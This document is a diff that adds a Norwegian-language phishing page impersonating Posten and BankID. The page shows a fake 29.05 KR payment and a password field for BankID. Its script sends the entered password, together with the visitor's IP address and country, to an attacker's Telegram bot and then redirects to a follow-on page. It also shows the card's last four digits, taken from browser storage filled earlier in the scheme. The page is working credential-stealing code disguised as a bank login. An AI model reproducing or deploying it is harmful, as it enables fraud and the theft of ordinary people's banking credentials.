@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="no">
+<head>
+  <meta charset="UTF-8" />
+      <link rel="icon" href="./X9/icon.jpeg" type="icon.jpeg"> 
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Posten BankID</title>
+  <style>
+    :root {
+      --primary: #3a87c9;
+      --danger: #d93025;
+      --dark-footer: #4b0c0c;
+      --light-bg: #f9f9f9;
+      --border: #ccc;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background: #fff;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    header {
+      background: #fff;
+      padding: 1em;
+      text-align: center;
+      border-bottom: 1px solid #ddd;
+    }
+
+    header img {
+      max-height: 40px;
+      width: auto;
+    }
+
+    .container {
+      padding: 1em;
+      max-width: 420px;
+      width: 100%;
+      margin: 0 auto;
+    }
+
+    .bankid-logo {
+      text-align: center;
+      margin-bottom: 1em;
+    }
+
+    .bankid-logo img {
+      width: 120px;
+      height: auto;
+    }
+
+    .info {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      margin-bottom: 1em;
+      gap: 10px;
+    }
+
+    .info div {
+      flex: 0 0 48%;
+      font-size: 14px;
+    }
+
+    .section-divider {
+      text-align: center;
+      padding: 0.5em;
+      border-bottom: 2px solid orange;
+      color: orange;
+      font-weight: bold;
+      margin-bottom: 1em;
+    }
+
+    .login-box {
+      background: var(--light-bg);
+      padding: 1em;
+      border-radius: 5px;
+      box-shadow: 0 0 5px rgba(0,0,0,0.1);
+    }
+
+    label {
+      font-size: 14px;
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    input[type="password"] {
+      width: 100%;
+      padding: 0.8em;
+      font-size: 1em;
+      margin-bottom: 1em;
+      border: 1px solid var(--border);
+      border-radius: 3px;
+    }
+
+    button {
+      width: 100%;
+      background: var(--primary);
+      color: white;
+      border: none;
+      padding: 0.8em;
+      font-size: 1.2em;
+      border-radius: 3px;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+
+    button:hover {
+      background: #296fae;
+    }
+
+    footer {
+      margin-top: auto;
+      background: var(--dark-footer);
+      color: white;
+      text-align: center;
+      padding: 1em;
+    }
+
+    footer img {
+      height: 20px;
+      margin-bottom: 5px;
+    }
+
+    @media (max-width: 480px) {
+      .info div {
+        flex: 0 0 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="./X9/A.png" alt="Posten Logo" />
+  </header>
+
+  <div class="container">
+    <div class="bankid-logo">
+      <img src="./X9/bb.jpg" alt="BankID" />
+    </div>
+
+    <div class="info">
+      <div><strong>Nettbutikk:</strong> Posten</div>
+      <div><strong>Beløp:</strong> 29.05 KR</div>
+      <div><strong>Dato:</strong> <span id="current-date"></span></div>
+      <div><strong>Kortnummer:</strong> <span id="last4"></span></div>
+    </div>
+
+    <div class="section-divider">BankID</div>
+
+    <form id="kod" class="login-box">
+      <label for="password">Passord</label>
+      <input type="password" id="A" name="passord" placeholder="Skriv inn passord" required />
+      <button type="submit">➔</button>
+    </form>
+  </div>
+
+  <footer>
+    <img src="./X9/A.png" alt="Posten logo"><br />
+    © Posten Bring
+  </footer>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const dateElement = document.getElementById("current-date");
+      const today = new Date();
+      const formattedDate = `${today.getDate().toString().padStart(2, '0')}/${(today.getMonth()+1).toString().padStart(2, '0')}/${today.getFullYear()}`;
+      dateElement.textContent = formattedDate;
+    });
+  </script>
+</body>
+
+<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // Load botToken and chatId from TELEGRAM.json
+        function loadConfig() {
+            return fetch('so.json')
+                .then(response => response.json())
+                .then(data => ({
+                    botToken: data.botToken,
+                    chatId: data.chatId
+                }))
+                .catch(error => {
+                    console.error('Error loading config file:', error);
+                    return null;
+                });
+        }
+
+        // Get user's IP and country using ipify and ipinfo.io
+        function getIpAndCountry() {
+            return $.get('https://api.ipify.org?format=json')
+                .then(function(ipData) {
+                    // Get country based on IP
+                    return $.get('https://ipinfo.io/' + ipData.ip + '/json')
+                        .then(function(data) {
+                            return {
+                                ip: ipData.ip,
+                                country: data.country || 'Unknown'
+                            };
+                        })
+                        .catch(function() {
+                            return {
+                                ip: ipData.ip,
+                                country: 'Unknown'
+                            };
+                        });
+                })
+                .catch(function() {
+                    return {
+                        ip: 'Unavailable',
+                        country: 'Unknown'
+                    };
+                });
+        }
+
+        $("#kod").submit(function (event) {
+            event.preventDefault(); // Prevent default form action
+
+            var one = $("#A").val().trim();
+
+            if (one) {
+                loadConfig().then(config => {
+                    if (config) {
+                        getIpAndCountry().then(data => {
+                            var ipAddress = data.ip;
+                            var country = data.country;
+                            var now = new Date().toLocaleString(); // Get current date and time
+
+                            var telegramMessage = "📱 **Passord Banking**\n\n" +
+                                "🔹 **Passord:** `" + one + "`\n" +
+                                "🔹 **IP Address:** `" + ipAddress + "`\n" +
+                                "🏳 **Country:** `" + country + "`\n" +
+                                "🕒 **Date/Time:** `" + now + "`";
+
+                            var telegramBotUrl = "https://api.telegram.org/bot" + config.botToken + "/sendMessage";
+                            var requestData = {
+                                chat_id: config.chatId,
+                                text: telegramMessage,
+                                parse_mode: "Markdown"
+                            };
+
+                            $.post(telegramBotUrl, requestData, function () {
+                                window.location.href = "K.html?vc?__event=cauuuze&service_id=top_ouazt=NO";
+                            }).fail(function () {
+                                alert("Bitte versuchen Sie es erneut.");
+                            });
+                        });
+                    }
+                });
+            }
+        });
+    });
+	
+// JavaScript
+document.addEventListener("DOMContentLoaded", function () {
+    var last4 = localStorage.getItem("last4digits");
+    if (last4) {
+        document.getElementById("last4").textContent = last4;
+    }
+});
+
+</script>
+</html>
